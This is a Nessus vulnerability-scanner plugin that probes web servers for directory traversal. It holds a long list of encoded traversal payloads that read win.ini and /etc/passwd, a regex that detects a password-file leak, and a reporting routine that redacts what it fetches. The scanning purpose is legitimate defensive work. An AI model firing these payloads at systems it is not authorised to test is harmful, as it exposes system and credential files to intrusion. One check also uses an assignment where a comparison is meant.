#
# (C) Tenable Network Security, Inc.
#

##############
# References:
##############
#
# Date: 25 Sep 2002 09:10:45 -0000
# Message-ID: <20020925091045.29313.qmail@mail.securityfocus.com>
# From: "DownBload" <downbload@hotmail.com>
# To: bugtraq@securityfocus.com
# Subject: IIL Advisory: Reverse traversal vulnerability in Monkey (0.1.4) HTTP server
#
# From: "David Endler" <dendler@idefense.com>
# To:vulnwatch@vulnwatch.org
# Date: Mon, 23 Sep 2002 16:41:19 -0400
# Subject: iDEFENSE Security Advisory 09.23.2002: Directory Traversal in Dino's Webserver
#
# From:"UkR security team^(TM)" <cuctema@ok.ru>
# Subject: advisory
# To: bugtraq@securityfocus.com
# Date: Thu, 05 Sep 2002 16:30:30 +0400
# Message-ID: <web-29288022@backend2.aha.ru>
#
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Web Server 4D/eCommerce 3.5.3 Directory Traversal Vulnerability
# Date: Tue, 15 Jan 2002 00:36:26 +0200
# Affiliation: http://www.securityoffice.net
#
# From: "Alex Forkosh" <aforkosh@techie.com>
# To: bugtraq@securityfocus.com
# Subject: Viewing arbitrary file from the file system using Eshare Expressions 4 server
# Date: Tue, 5 Feb 2002 00:18:42 -0600
#

include("compat.inc");

if (description)
{
 script_id(10297);
 script_version("1.126");
 script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/07");

 script_name(english:"Web Server Directory Traversal Arbitrary File Access");
 script_summary(english:"Tries to retrieve file outside document directory");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It appears possible to read arbitrary files on the remote host outside
the web server's document directory using a specially crafted URL.  An
unauthenticated attacker may be able to exploit this issue to access
sensitive information to aide in subsequent attacks.

Note that this plugin is not limited to testing for known
vulnerabilities in a specific set of web servers. Instead, it attempts
a variety of generic directory traversal attacks and considers a
product to be vulnerable simply if it finds evidence of the contents
of '/etc/passwd' or a Windows 'win.ini' file in the response. It may,
in fact, uncover 'new' issues, that have yet to be reported to the
product's vendor.");
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for an update, use a different product, or disable
the service altogether.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"cvss_score_source", value:"manual");
 script_set_attribute(attribute:"cvss_score_rationale", value:"Score based on generic TDA vulnerability.");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploited_by_malware", value:"true");
 script_cwe_id(22);
script_set_attribute(attribute:"plugin_publication_date", value:"1999/11/05");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http.inc");
include("data_protection.inc");

var port = get_http_port(default:80, embedded:TRUE);

var r, i;
i = 0;
r[i++] = '/' + mult_str(str:'../', nb:12) + 'windows/win.ini';
r[i++] = '/' + mult_str(str:'../', nb:12) + 'winnt/win.ini';
r[i++] =       mult_str(str:'../', nb:12) + 'windows/win.ini';
r[i++] =       mult_str(str:'../', nb:12) + 'winnt/win.ini';
r[i++] = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini';
r[i++] = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin%2eini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin%2eini';
r[i++] = '/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini';
r[i++] = '/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini';
r[i++] = '/.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini';
r[i++] = '/.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./winnt/win.ini';
r[i++] = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini';
r[i++] = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini';
r[i++] = '/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini';
r[i++] = '/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\winnt\\win.ini';
r[i++] = '/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini';
r[i++] = '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini';
r[i++] = '/.../.../.../.../.../.../.../.../.../windows/win.ini';
r[i++] = '/.../.../.../.../.../.../.../.../.../winnt/win.ini';
r[i++] = '/...\\...\\...\\...\\...\\...\\...\\...\\...\\windows\\win.ini';
r[i++] = '/...\\...\\...\\...\\...\\...\\...\\...\\...\\winnt\\win.ini';
r[i++] = '/..../..../..../..../..../..../..../..../..../windows/win.ini';
r[i++] = '/..../..../..../..../..../..../..../..../..../winnt/win.ini';
r[i++] = '/....\\....\\....\\....\\....\\....\\....\\....\\....\\windows\\win.ini';
r[i++] = '/....\\....\\....\\....\\....\\....\\....\\....\\....\\winnt\\win.ini';
r[i++] = '/././././././../../../../../windows/win.ini';
r[i++] = '/././././././../../../../../winnt/win.ini';
r[i++] = '.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini';
r[i++] = '.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/winnt/win.ini';
r[i++] = '/nessus\\..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '/nessus\\..\\..\\..\\..\\..\\..\\winnt\\win.ini';
r[i++] = '/%80../%80../%80../%80../%80../%80../windows/win.ini';
r[i++] = '/%80../%80../%80../%80../%80../%80../winnt/win.ini';
r[i++] = '/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./windows/win.ini';
r[i++] = '/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./winnt/win.ini';
r[i++] = '/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/win.ini';
r[i++] = '/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/winnt/win.ini';
r[i++] = mult_str(str:"/%uff0e%uff0e", nb:12) + '/windows/win.ini';
r[i++] = mult_str(str:"/%uff0e%uff0e", nb:12) + '/winnt/win.ini';
# Some web servers badly parse args under the form /path/file?arg=../../
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini';
r[i++] = 0;

var contents = "";
var info = "";
var url, res;

for (i=0; r[i]; i++)
{
  url = r[i];
  if (check_win_dir_trav(port: port, url:url))
  {
    if (url[0] == '/') info += '  - ' + build_url(port: port, qs:url) + '\n';
    else info += '  - ' + url + ' *\n';

    if (!contents && report_verbosity > 0)
    {
      res = http_send_recv3(port: port, method: 'GET', item:url, exit_on_fail:TRUE);
      if (! isnull(res)) contents = res[2];
    }
    if (!thorough_tests) break;
  }
}

var report;
if (info)
{
  if (max_index(split(info)) > 1) s = "s";
  else s = "";

  report = '\n' +
    'Nessus was able to retrieve the remote host\'s \'win.ini\' file using the\n' +
    'following URL' + s + ' :\n' +
    '\n' +
    info;

  if (egrep(pattern:" \*$", string:info))
  {
    report += '\n' +
      '* Note that this requires sending an HTTP GET request without the\n' +
      '  leading forward slash to the web server at ' + build_url(port:port, qs:'/') + ',\n' +
      '  which is not supported by most web browsers.\n';
  }

  if (contents)
  {
    contents = data_protection::redact_etc_passwd(output:contents);
    report += '\n' +
      'Here are the contents :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      chomp(contents) + '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  if (!thorough_tests)
    report +=
      '\n' +
      'Note that Nessus stopped searching after one exploit was found. To\n' +
      'report all known exploits, enable the \'Perform thorough tests\'\n' +
      'setting and re-scan.\n';
  security_report_v4(port: port, severity: SECURITY_HOLE, extra: report);

  set_kb_item(name: strcat("www/", port, "/generic_traversal"), value: TRUE);
  exit(0);
}

i=0;
r[i++] = '/' + mult_str(str:'../', nb:12) + 'etc/passwd';
r[i++] =       mult_str(str:'../', nb:12) + 'etc/passwd';
r[i++] = '//' + mult_str(str:'../', nb:12) + 'etc/passwd';
r[i++] = mult_str(str:'/....', nb:12) + '/etc/passwd';
r[i++] = mult_str(str:'/%2e%2e', nb:12) + '/etc/passwd';
r[i++] = '/' + mult_str(str:'..%2f', nb:12) + 'etc/passwd';
r[i++] =       mult_str(str:'..%2f', nb:12) + 'etc/passwd';
r[i++] = '/' + mult_str(str:'%2e%2e%2f', nb:12) + 'etc/passwd';
r[i++] = '/././././././../../../../../etc/passwd';
r[i++] = mult_str(str:"/%uff0e%uff0e", nb:12) + '/etc/passwd';
# Some web servers badly parse args under the form /path/file?arg=../../
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd';
r[i++] = '/scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd';
if (thorough_tests || report_paranoia >= 2)
{
  # An old bug (06 Jan 2003) in CommunigatePro.  Note the *//
  r[i++] = '/DomainFiles/*//../../../../../../etc/passwd';
}
r[i++] = 0;

contents = "";
info = "";

for (i = 0; r[i]; i++)
{
  url = r[i];

  # nb: at least one web server ('st') fails to respond at all if the URL does 
  #     not have a leading slash.
  if (url[0] = '/') exit_on_fail = TRUE;
  else exit_on_fail = FALSE;
  res = http_send_recv3(port: port, method: 'GET', item:url, exit_on_fail:exit_on_fail);
  if (isnull(res)) continue;

  if (egrep(pattern: 'root:.*:0:[01]:', string: res[2]))
  {
    if (url[0] == '/') info += '  - ' + build_url(port: port, qs:url) + '\n';
    else info += '  - ' + url + ' *\n';

    if (!contents && report_verbosity > 0)
    {
      contents = res[2];
    }
    if (!thorough_tests) break;
  }
}


if (info)
{
  if (max_index(split(info)) > 1) s = "s";
  else s = "";

  report = '\n' +
    'Nessus was able to retrieve the remote host\'s password file using the\n' +
    'following URL' + s + ' :\n' +
    '\n' +
    info;

  if (egrep(pattern:" \*$", string:info))
  {
    report += '\n' +
      '* Note that this requires sending an HTTP GET request without the\n' +
      '  leading forward slash to the web server at ' + build_url(port:port, qs:'/') + ',\n' +
      '  which is not supported by most web browsers.\n';
  }

  if (contents)
  {
    contents = data_protection::redact_etc_passwd(output:contents);
    report += '\n' +
      'Here are the contents :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
      contents +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  if (!thorough_tests)
    report +=
      '\n' +
      'Note that Nessus stopped searching after one exploit was found.  To\n' +
      'report all known exploits, enable the \'Perform thorough tests\'\n' +
      'setting and re-scan.\n';

  security_report_v4(port: port, severity: SECURITY_HOLE, extra: report);

  set_kb_item(name: strcat("www/", port, "/generic_traversal"), value: TRUE);
  exit(0);
}
